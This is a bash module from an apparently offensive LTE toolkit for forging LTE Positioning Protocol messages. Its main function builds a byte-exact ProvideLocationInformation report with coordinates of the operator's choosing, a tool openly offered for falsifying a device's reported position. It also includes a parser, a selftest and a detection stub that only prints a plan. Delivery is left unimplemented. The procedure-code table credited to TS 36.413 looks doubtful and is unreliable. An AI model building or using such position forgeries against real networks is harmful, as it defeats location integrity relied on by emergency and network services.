#!/usr/bin/env bash
# LPP Position Forgery — LTE Positioning Protocol (TS 37.355)
#
# LPP (LTE Positioning Protocol) is the positioning payload itself; it is not
# carried directly. Between the eNB and the E-SMLC it rides LPPa over S1AP
# (TS 36.455, TS 36.413), between the E-SMLC and the UE it rides NAS, and in
# 5G the same role is NRPPa (TS 38.455) over NGAP. This module builds and
# reads the LPP message, which is the part that carries the position.
#
# Attack owned: O14/P8 adjacency (location via signalling, positioning
# integrity). `--forge-position` builds a real LPP ProvideLocationInformation
# -- the message a target device sends the E-SMLC when it reports where it is
# -- with coordinates of the operator's choosing. `--parse-position` reads one
# back. Both go through the generated PER codec (tools/lte_asn1.py "lpp-*",
# table tools/lpp_layout.py from pycrate), so the bytes are the message, not an
# approximation of it; tools/lpp-oracle/check_lpp_position.py asserts that
# against pycrate bit for bit.
#
# What is NOT done here: delivery. To reach an E-SMLC the PDU has to be
# carried by a UE's NAS security context or by an eNB-side LPPa peer. Both are
# real projects (...11_lte_core.sh has S1AP), and neither is pretended below:
# --forge-position builds and stops, saying what it stopped short of
# (MODULE_CONVENTIONS §9).
#
# The S1AP elementary-procedure header helpers (--build-header, --decode-header,
# --list-pids) describe the header that sits INSIDE an S1AP PDU, in front of an
# LPPa payload: a real S1AP frame also carries an initiatingMessage /
# successfulOutcome / unsuccessfulOutcome tag and a PDU length before it.
#
# Resolve IMSISTING_ROOT from this script's own path.
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/lpp"
LPP_DIR="$LOOT_DIR/lpp"
mkdir -p "$MOD_TMP" "$LPP_DIR" 2>/dev/null

# Palette
C_RED=$'\e[38;5;196m'; C_GRN=$'\e[38;5;46m';   C_YEL=$'\e[38;5;226m'
C_CYN=$'\e[38;5;51m';  C_MAG=$'\e[38;5;201m';  C_BLU=$'\e[38;5;39m'
C_ORG=$'\e[38;5;208m'; C_PUR=$'\e[38;5;135m';  C_DIM=$'\e[38;5;240m'
C_WHT=$'\e[38;5;255m'; C_BOLD=$'\e[1m';        C_RESET=$'\e[0m'
export C_RED C_GRN C_YEL C_CYN C_MAG C_BLU C_ORG C_PUR C_DIM C_WHT C_BOLD C_RESET

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }

# ── status ──────────────────────────────────────────────────────────────
lpp_status_tsv() {
    local tool_missing=()
    for t in python3; do
        command -v "$t" >/dev/null 2>&1 || tool_missing+=("$t")
    done
    local status=ok
    ((${#tool_missing[@]} > 0)) && status=missing
    printf 'STATUS\t%s\n' "$status"
    ((${#tool_missing[@]} > 0)) && printf 'MISSING\t%s\n' "$(IFS=,; echo "${tool_missing[*]}")"
}

# ── LPP protocol ID mapping (TS 36.413 §9.2) ───────────────────────────
declare -A LPP_PIDS=(
    [1]="locationInformation"
    [2]="positioningData"
    [3]="positioningInitialization"
    [4]="locationAlert"
    [5]="positioningUpdate"
    [6]="locationMeasurements"
)

get_lpp_pid_name() {
    local pid="$1"
    echo "${LPP_PIDS[$pid]:-unknown}"
}

# ── LPP message header decoding (TS 36.413 §9.3) ────────────────────────
lpp_decode_header() {
    local hex="$1"
    [[ -z "$hex" || ${#hex} -lt 8 ]] && { warn "LPP header too short"; return 1; }
    
    local procedure_code=$((16#${hex:0:2}))
    local criticality="${hex:2:2}"
    local length=$((16#${hex:4:4}))
    
    local proc_name=$(get_lpp_pid_name $procedure_code)
    
    cat << EOF
LPP Header
==========
Procedure Code: $procedure_code (0x$procedure_code) ($proc_name)
Criticality:    0x$criticality
Length:         $length bytes
EOF
}

lpp_build_header() {
    local procedure_code="${1:-1}"
    local criticality="${2:-reject}"
    local length="${3:-000c}"
    
    local crit_hex="00"
    case "$criticality" in
        reject) crit_hex="00" ;;
        ignore) crit_hex="01" ;;
        notify) crit_hex="02" ;;
    esac
    
    printf '%02x%s%s' "$procedure_code" "$crit_hex" "$length"
}

# ── the generated PER codec (tools/lte_asn1.py) ────────────────────────
# One implementation of TS 37.355 for the whole toolkit. The table is
# generated from pycrate and checked against it, so the module never
# hand-assembles a coordinate: the previous version of this file read latitude
# and longitude out of fixed byte offsets (hex:24:8 and hex:32:8) of an
# arbitrary buffer, which produced a position for any input at all and could
# never have matched a real message.
lpp_asn1() {
    python3 "$IMSISTING_ROOT/tools/lte_asn1.py" "$@"
}

# ── forge a position report ───────────────────────────────────────────
# <lat>,<lon> [radius-metres] -- builds a real LPP-Message carrying a
# ProvideLocationInformation. The radius selects TS 37.355's
# Ellipsoid-PointWithUncertaintyCircle (0..127 m); without it the report is a
# bare Ellipsoid-Point.
lpp_forge_position() {
    local spec="${1:-}"
    if [[ -z "$spec" ]]; then
        err "usage: --forge-position <lat>,<lon> [radius-metres]"
        err "  e.g. --forge-position 51.5007,-0.1246 30"
        return 2
    fi
    if [[ "$spec" != *,* ]]; then
        err "give the position as <lat>,<lon> (e.g. 51.5007,-0.1246)"
        return 2
    fi
    local lat="${spec%%,*}" lon="${spec#*,}" radius="${2:-}"
    local -a args=(lpp-encode --lat "$lat" --lon "$lon")
    [[ -n "$radius" ]] && args+=(--radius "$radius")

    local out rc=0
    out=$(lpp_asn1 "${args[@]}" 2>&1) || rc=$?
    if (( rc != 0 )); then
        printf '%s\n' "$out" >&2
        return "$rc"
    fi
    local f
    f() { printf '%s\n' "$out" | awk -F'\t' -v k="$1" '$1==k{print $2}'; }

    printf 'status\tbuilt\n'
    printf 'message\tprovideLocationInformation\n'
    printf 'pdu_bits\t%s\n' "$(f pdu_bits)"
    printf 'pdu_hex\t%s\n' "$(f pdu_hex)"
    printf 'latitude\t%s\n'   "$(f lat_deg)"
    printf 'longitude\t%s\n'  "$(f lon_deg)"
    printf 'latitude_sign\t%s\n' "$(f lat_sign)"
    printf 'grid_latitude\t%s\n'  "$(f deg_lat)"
    printf 'grid_longitude\t%s\n' "$(f deg_lon)"
    [[ -n "$radius" ]] && printf 'radius_m\t%s\n' "$radius"
    printf 'transport\t%s\n' "LPP over NAS (UE to E-SMLC) or LPPa over S1AP (eNB to E-SMLC, TS 36.455)"
    printf 'delivery\t%s\n' "not performed: this verb builds the message"
    printf 'requires\t%s\n' "a UE stack holding the target's NAS security context, or an eNB-side LPPa peer (11_lte_core.sh has S1AP); delivering an LPP message needs one of the two"
    printf 'note\t%s\n' "the E-SMLC records what the device reports; a device that reports a false position in a correctly encoded message is indistinguishable from an honest one at this layer"
    return 0
}

# ── read a position out of an LPP message ─────────────────────────────
# <hex|file> -- decodes the message and reports the estimate it carries. This
# is the read side of --forge-position and the check for a captured one.
lpp_parse_position() {
    local src="${1:-}"
    if [[ -z "$src" ]]; then
        err "usage: --parse-position <hex|file>"
        return 2
    fi
    local -a args
    if [[ -f "$src" ]]; then args=(--file "$src"); else args=(--hex "$src"); fi

    local out rc=0
    out=$(lpp_asn1 lpp-decode "${args[@]}" 2>&1) || rc=$?
    if (( rc != 0 )); then
        printf '%s\n' "$out" >&2
        return 1
    fi
    local f
    f() { printf '%s\n' "$out" | awk -F'\t' -v k="$1" '$1==k{print $2}'; }

    if [[ "$(f estimate)" == "none" ]]; then
        printf 'status\tno-position\n'
        printf 'body\t%s\n' "$(f body)"
        printf 'note\t%s\n' "$(f note)"
        return 0
    fi
    printf 'status\tdecoded\n'
    printf 'body\t%s\n' "$(f body)"
    printf 'shape\t%s\n' "$(f shape)"
    printf 'latitude\t%s\n' "$(f latitude)"
    printf 'longitude\t%s\n' "$(f longitude)"
    [[ -n "$(f radius_m)" ]] && printf 'radius_m\t%s\n' "$(f radius_m)"
    [[ -n "$(f transaction_number)" ]] && \
        printf 'transaction_number\t%s\n' "$(f transaction_number)"
    printf 'consistency\t%s\n' "compare against the serving cell: a forged fix that ignores timing advance and RSRP is inconsistent with both"
    return 0
}

# ── Position forgery detection ─────────────────────────────────────────
# Handoff, not a detection engine. LPP positioning payloads are ASN.1 PER
# (TS 37.355) carried inside LPPa/NRPPa; the latitude/longitude live in
# ProvideLocationInformation, which the TS 36.413 transport header above does
# not reach. Printing a verdict without decoding that layer would be a
# fabricated result, so this verb prints the plan and the exact tool needed
# instead (MODULE_CONVENTIONS §9).
lpp_detect_forgery() {
    local pcap="$1"
    [[ -z "$pcap" ]] && { warn "usage: --detect-forgery <pcap>"; return 1; }
    [[ -f "$pcap" ]] || { err "no such capture: $pcap"; return 1; }
    
    cat << EOF
Forged Position Detection: $pcap
================================
status: handoff

This module performs no detection on this capture. One layer is missing:

  Transport — LPP rides LPPa (S1AP, TS 36.413) or NRPPa (NGAP, TS 38.413), so
  the capture must first be dissected to the LPP PDU. The payload layer is not
  missing any more: once the PDU is out, --parse-position reads it.

  tshark (>= 3.x, LPP dissector) or Wireshark
      tshark -r $(printf '%q' "$pcap") -Y lpp -T fields -e lpp.pdu
  then feed each PDU to:  46_lpp.sh --parse-position <hex>

What to compare once decoded:
  - a reported accuracy better than the measured reference signal supports
  - a reported position inconsistent with the serving cell's timing advance
    and RSRP (a spoofed fix usually cannot stay consistent with both)
  - a report whose coordinates are inside the range but whose uncertainty is
    smaller than the cell geometry can support (--forge-position shows what a
    well-formed lie looks like; the range check alone will not catch it)

For a reference signal to compare against, run 02_cell_recon or 39_ta_geoloc
against the same serving cell.
EOF
}

# ── Selftest ───────────────────────────────────────────────────────────
lpp_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }

    # 1. Procedure code mapping
    chk pid-1-name "$(get_lpp_pid_name 1)" "locationInformation"
    chk pid-2-name "$(get_lpp_pid_name 2)" "positioningData"
    chk pid-99-unknown "$(get_lpp_pid_name 99)" "unknown"

    # 2. Header encoding
    local hdr=$(lpp_build_header 1 reject 000c)
    chk header-len "${#hdr}" "8"
    chk header-proc "$(printf '%02x' 1)" "01"

    # 3. Header decoding
    local dec=$(lpp_decode_header "0100000c")
    chk dec-proc "$(echo "$dec" | grep 'Procedure Code:' | awk '{print $3}')" "1"
    chk dec-len "$(echo "$dec" | grep 'Length:' | awk '{print $2}')" "12"

    # 4. A forged position report is a real LPP message. The bytes are pinned
    #    to what pycrate produces for the same value (tools/lpp-oracle/
    #    check_lpp_position.py asserts the whole family); pinning one here
    #    means a regenerated table that moves a bit is caught by the module's
    #    own selftest and not only by the oracle run.
    local out rc
    out=$(lpp_forge_position 51.5007,-0.1246 2>/dev/null); rc=$?
    chk forge-rc "$rc" "0"
    chk forge-status "$(echo "$out" | awk -F'\t' '$1=="status"{print $2}')" "built"
    chk forge-bits "$(echo "$out" | awk -F'\t' '$1=="pdu_bits"{print $2}')" "94"
    chk forge-hex "$(echo "$out" | awk -F'\t' '$1=="pdu_hex"{print $2}')" \
        "D2020028410124FB55FFA544"
    chk forge-message "$(echo "$out" | awk -F'\t' '$1=="message"{print $2}')" \
        "provideLocationInformation"
    chk forge-lat "$(echo "$out" | awk -F'\t' '$1=="latitude"{print $2}')" "51.5007000"
    chk forge-lon "$(echo "$out" | awk -F'\t' '$1=="longitude"{print $2}')" "-0.1246000"
    # The uncertainty variant is a different message, not a comment on this one.
    out=$(lpp_forge_position 51.5007,-0.1246 30 2>/dev/null)
    chk forge-radius-rc "$?" "0"
    chk forge-radius-hex "$(echo "$out" | awk -F'\t' '$1=="pdu_hex"{print $2}')" \
        "D2020028410524FB55FFA544F0"
    chk forge-radius-m "$(echo "$out" | awk -F'\t' '$1=="radius_m"{print $2}')" "30"
    # It must refuse rather than approximate what the protocol cannot carry.
    chk forge-lat-high "$(lpp_forge_position 91,0 >/dev/null 2>&1; echo $?)" "2"
    chk forge-lon-high "$(lpp_forge_position 0,181 >/dev/null 2>&1; echo $?)" "2"
    chk forge-radius-high "$(lpp_forge_position 51,-1 128 >/dev/null 2>&1; echo $?)" "2"
    chk forge-noarg "$(lpp_forge_position "" >/dev/null 2>&1; echo $?)" "2"
    chk forge-nocomma "$(lpp_forge_position 51.5 >/dev/null 2>&1; echo $?)" "2"

    # 5. Reading one back must return the position, not an offset.
    out=$(lpp_parse_position "D2020028410524FB55FFA544F0" 2>/dev/null); rc=$?
    chk parse-rc "$rc" "0"
    chk parse-status "$(echo "$out" | awk -F'\t' '$1=="status"{print $2}')" "decoded"
    chk parse-shape "$(echo "$out" | awk -F'\t' '$1=="shape"{print $2}')" \
        "ellipsoidPointWithUncertaintyCircle"
    chk parse-radius "$(echo "$out" | awk -F'\t' '$1=="radius_m"{print $2}')" "30"
    chk parse-lat "$(awk -F'\t' '$1=="latitude"{printf "%.4f", $2}' <<<"$out")" "51.5007"
    chk parse-lon "$(awk -F'\t' '$1=="longitude"{printf "%.4f", $2}' <<<"$out")" "-0.1246"
    # An arbitrary buffer used to produce a position here (it read bytes 24..32
    # as latitude and 32..40 as longitude and printed them as degrees). The
    # same buffer now decodes, correctly, as carrying no location estimate --
    # and the assertion that matters is that no coordinate comes out of it.
    out=$(lpp_parse_position "000000000000000000000000000000000000000000000000" 2>/dev/null)
    chk parse-junk-status "$(echo "$out" | awk -F'\t' '$1=="status"{print $2}')" "no-position"
    chk parse-junk-no-lat "$(echo "$out" | grep -c 'latitude')" "0"
    out=$(lpp_parse_position "$(lpp_build_header 1 reject 000c)" 2>/dev/null)
    chk parse-header-only "$(echo "$out" | awk -F'\t' '$1=="status"{print $2}')" "no-position"
    chk parse-header-only-no-lat "$(echo "$out" | grep -c 'latitude')" "0"

    # 6. Unknown values must fail
    chk header-short "$(lpp_decode_header "01" >/dev/null 2>&1; echo $?)" "1"
    chk parse-empty "$(lpp_parse_position "" >/dev/null 2>&1; echo $?)" "2"
    chk parse-missing "$(lpp_parse_position >/dev/null 2>&1; echo $?)" "2"

    # 7. --detect-forgery is a handoff: it must refuse rather than invent a
    #    verdict, and it must never claim an analysis it did not run.
    chk forgery-noargs "$(lpp_detect_forgery >/dev/null 2>&1; echo $?)" "1"
    chk forgery-nofile "$(lpp_detect_forgery /nonexistent-lpp.pcap >/dev/null 2>&1; echo $?)" "1"
    local forgery_out=$(lpp_detect_forgery "$BASH_SOURCE" 2>&1)
    chk forgery-says-handoff "$(echo "$forgery_out" | grep -c 'status: handoff')" "1"
    chk forgery-no-verdict "$(echo "$forgery_out" | grep -ciE 'anomalies detected|position outside valid bounds')" "0"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ───────────────────────────────────────────────────────────────
lpp_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== LPP Position Forgery ===${C_RESET}\n"
        cat << 'M'
  [1]  List LPP procedure codes
  [2]  Decode LPP header
  [3]  Build LPP header
  [4]  Forge a position report
  [5]  Parse a position report
  [6]  Detect forged positions
  [0]  back

M
        read -rp "  choice> " c || return 0
        case "$c" in
            1)
                for pid in "${!LPP_PIDS[@]}"; do
                    echo "$pid -> $(get_lpp_pid_name $pid)"
                done
                read -rp "  press enter " _ ;;
            2)
                read -rp "  hex> " h
                lpp_decode_header "$h"; read -rp "  press enter " _ ;;
            3)
                read -rp "  proc_code> " p
                read -rp "  crit> " c
                read -rp "  length> " l
                echo "$(lpp_build_header "$p" "$c" "$l")"
                read -rp "  press enter " _ ;;
            4)
                read -rp "  latitude,longitude> " u
                read -rp "  radius metres (blank for a bare point)> " m
                lpp_forge_position "$u" "$m"
                read -rp "  press enter " _ ;;
            5)
                read -rp "  hex or file> " h
                lpp_parse_position "$h"; read -rp "  press enter " _ ;;
            6)
                read -rp "  pcap path> " p
                lpp_detect_forgery "$p"; read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ───────────────────────────────────────────────────────
lpp_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)   lpp_status_tsv ;;
        --list-pids)    for pid in "${!LPP_PIDS[@]}"; do echo "$pid -> $(get_lpp_pid_name $pid)"; done ;;
        --decode-header) lpp_decode_header "${1:-}" ;;
        --build-header)  lpp_build_header "${1:-1}" "${2:-reject}" "${3:-000c}" ;;
        --forge-position) lpp_forge_position "${1:-}" "${2:-}" ;;
        --parse-position) lpp_parse_position "${1:-}" ;;
        --detect-forgery) lpp_detect_forgery "${1:-}" ;;
        --selftest)     lpp_selftest ;;
        --menu)         lpp_menu ;;
        *) cat >&2 <<EOF
LPP Position Forgery — LTE Positioning Protocol

Usage: $0 COMMAND
  --status-tsv         tool and store state as TSV
  --list-pids          list LPP procedure codes
  --decode-header <hex>
  --build-header [proc] [crit] [len]
  --forge-position <lat>,<lon> [radius-m]
                       build an LPP position report with these coordinates
  --parse-position <hex|file>
                       decode an LPP message and print the position in it
  --detect-forgery <pcap>
  --selftest           verify tables and parsers
  --menu               interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    lpp_cli_main "$@"
fi
